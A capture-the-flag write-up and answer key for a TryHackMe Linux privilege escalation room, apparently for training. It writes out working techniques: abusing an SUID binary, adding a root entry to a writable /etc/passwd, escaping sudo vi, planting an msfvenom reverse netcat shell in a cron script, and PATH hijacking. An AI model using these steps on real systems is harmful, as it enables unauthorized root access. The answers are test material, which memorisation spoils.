# [THM] - Common Linux Privesc

[Room link](https://tryhackme.com/room/commonlinuxprivesc)

--- 

 ## Task 1/2/3
  
**No aswer required**

--- 

## Task 5

1. First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

**No aswer required**

2. What is the target's hostname?

**polobox**

3. Look at the output of /etc/passwd how many "user[x]" are there on the system?

**8**

4. How many available shells are there on the system?

**4**

5. What is the name of the bash script that is set to run every 5 minutes by cron?

**autoscript.sh**

6. What critical file has had its permissions changed to allow some users to write to it?

**/etc/passwd**

7. Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!

**No answer required**

---

## Task 5

1. What is the path of the file in user3's directory that stands out to you?

**/home/user3/shell**

2. We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it! We can do this by running: "./shell"

**No answer required**

3. Congratulations! You should now have a shell as root user, well done!

**No answer required**

---

## Task 6

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"

**No answer required**

2. Having read the information above, what direction privilege escalation is this attack?

**Vertical**

3. Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]" What is the hash created by using this command with the salt, "new" and the password "123"?

**$1$new$p7ptkEKU1HnaHpRtzNizS1**

4. Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

**new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0::/root:/bin/bash**

5. Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

**No answer required**

6. Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!

**No answer required**

---

## Task 7

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"

**No answer required**

2. Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

**NOPASSWD**

3. So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

**No answer required**

4. Now, type ":!sh" to open a shell!

**No answer required**

---

## Task 8

1. First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"

**No answer required**

2. Now, on our host machine- let's create a payload for our cron exploit using msfvenom.

**No answer required**

3. What is the flag to specify a payload in msfvenom?

**-p**

4. Create a payload using: "msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"

**No answer required**

5. What directory is the "autoscript.sh" under?

**/home/user4/Desktop**

6. Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

**No answer required**

7. After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvnp 8888" and wait for our shell to land!

**No answer required**

8. After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!

**No answer required**

---

## Task 9

1. Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"

**No answer required**

2. Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

**ls**

3. Now we know what command to imitate, let's change directory to "tmp".

**No answer required**

4. What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating

**echo "/bin/bash" > ls**

5. Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?

**chmod +x ls**

6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"

**No answer required**

7. Now, change directory back to user5's home directory.

**No answer required**

8. Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!

**No answer required**

---

## Task 10

**No answer required**
